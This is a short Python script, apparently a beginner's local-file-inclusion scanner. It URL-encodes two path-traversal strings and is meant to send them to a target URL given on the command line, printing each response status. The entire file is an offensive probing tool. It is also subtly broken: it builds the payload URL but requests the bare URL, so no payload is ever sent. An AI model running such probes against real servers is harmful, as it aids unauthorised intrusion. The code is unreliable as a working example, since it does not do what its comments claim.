import sys
import urllib.parse
import urllib.request
from urllib.error import HTTPError


def main(url):
    # Call our function encode_payloads to retrieve URL encoded payloads
    encoded_payloads = encode_payloads()

    # Call our function send_requests to send encoded payloads to the web server
    send_requests(encoded_payloads, url)


# URL encode our payloads to make sure spaces and special characters are interpreted properly. Otherwise, certain
# characters will confuse the browser for example if you don't encode "&" it will think you're sending another parameter.
def encode_payloads():
    payloads = [
        "/../../../../../",
        "/..//..//..//..//..//",
    ]

    encoded_payloads = []
    for payload in payloads:
        url_encoded_payload = urllib.parse.quote_plus(payload)
        encoded_payloads.append(url_encoded_payload)

    return encoded_payloads

# This function takes the encoded payloads, and url making requests to the webserver the number of requests depending on
# the number of payloads in our payloads list located in encode_payloads function. Print the status and reason.
def send_requests(payloads, url):
        payload_count = len(payloads)
        counter = 0
        while counter < payload_count:
            url_payload = url + payloads[counter]
            #request = urllib.request.Request(url_payload)
            try:
                with urllib.request.urlopen(url) as response:
                    counter += 1
                    print(f"{url} {response.status}")
            except HTTPError as e:
                print(f"{e.code} {e.reason} {url}")
                counter += 1



if __name__ == "__main__":
    if len(sys.argv) == 2:
        main(sys.argv[1])
    else:
        print("Usage: python local_file_inclusion.py <url>")